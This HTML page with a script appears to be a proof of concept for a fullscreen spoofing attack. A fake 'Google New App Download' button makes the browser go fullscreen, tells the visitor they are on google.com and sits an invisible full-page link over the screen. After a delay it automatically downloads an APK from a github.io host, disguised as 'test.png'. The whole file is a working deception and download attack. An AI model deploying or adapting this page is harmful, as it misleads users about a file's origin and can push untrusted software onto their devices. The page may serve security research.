<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Fullscreen + Delayed Download</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: sans-serif;
      background: black;
      color: white;
    }
    button {
      font-size: 20px;
      padding: 12px 24px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <button id="startBtn">Google New App Download Button</button>

  <script>
    const btn = document.getElementById("startBtn");

    btn.addEventListener("click", async () => {
      // Step 1: Request fullscreen
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      } else if (document.documentElement.webkitRequestFullscreen) {
        await document.documentElement.webkitRequestFullscreen();
      }

      // Step 2: Show initial message
      document.body.innerHTML = `
        <div style="text-align:center; font-size:22px;">
          Please wait a few seconds! We will redirect you to Google's Secret Dev Repository.
        </div>
      `;

      // Step 3: Wait 3 seconds, then replace with the invisible link setup
      setTimeout(() => {
        document.body.innerHTML = `
          <a href="https://google.com" id="fullPageLink"></a>
          <div id="downloadStatus" style="text-align:center; font-size:22px;">
            You on google.com now! check the left/right corner origin indicator
          </div>

          <style>
            html, body {
              height: 100%;
              margin: 0;
              background: black;
              overflow: hidden;
            }
            #fullPageLink {
              position: fixed;
              top: 0;
              left: 0;
              width: 100%;
              height: 100%;
              background: transparent;
              z-index: 1;
            }
            #downloadStatus {
              position: fixed;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              z-index: 2;
              color: white;
            }
          </style>
        `;

        // Step 4: Wait another 3 seconds, then trigger the download
        setTimeout(() => {
          const a = document.createElement("a");
          a.href = "https://frozzipies.github.io/googlebeta.apk"; // your hosted image
          a.download = "test.png";
          document.body.appendChild(a);
          a.click();
          a.remove();

          // Update text after download starts
          document.getElementById("downloadStatus").textContent = "Download started!";
        }, 7000);
      }, 5000);
    });
  </script>
</body>
</html>
